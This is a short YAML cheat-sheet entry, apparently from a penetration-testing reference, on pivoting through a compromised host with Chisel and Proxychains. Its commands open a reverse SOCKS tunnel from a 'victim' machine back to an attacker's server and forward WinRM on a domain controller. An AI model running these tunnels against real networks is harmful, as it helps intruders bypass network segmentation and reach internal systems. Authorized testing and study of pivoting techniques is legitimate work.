---
description: |
  Chisel crée des tunnels chiffrés entre ordinateurs, permettant une communication sécurisée sur des réseaux non fiables. Proxychains fait passer le trafic par des proxys, ce qui permet d'en dissimuler l'origine. Ensemble, ils offrent une couche supplémentaire de sécurité et de confidentialité. Chisel permet également la redirection de port, c'est-à-dire la redirection d'un port d'une machine locale vers une machine distante, ce qui est utile pour accéder à des services sur une machine distante qui n'est pas directement accessible. Cette combinaison d'outils peut offrir flexibilité et fonctionnalité tout en garantissant une communication sécurisée et privée.

  Command Reference:

    8000: port on machine on which the chisel server will be started

    server/client: role which the chisel should take

    10.10.21.16: IP address of attacking machine

    localhost/172.16.22.1: IP address for pointing the port to, localhost for port on victim machine. Or IP address of machine which is one hop further in the network (172.16.22.1, DC).

    9050: port on which proxychains is running

command: |
  ./chisel_1.8.1_linux_amd64 server -p 8000 --reverse

code: |
  ## /etc/proxychains4.conf
  socks5  127.0.0.1 9050 

  .\chisel.exe client 10.10.14.16:8000 R:9050:socks (socks proxy for using over 'proxychains' command)

  ./chisel_1.8.1_linux_amd64 client 10.10.14.16:8000 R:5985:localhost/172.16.22.1:5985 (port forwarding)

items:
  - Shell
services:
  - SERVICE
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Persistence
  - General
references:
  - https://github.com/jpillora/chisel
  - https://hack.technoherder.com/chisel/
  - https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/
---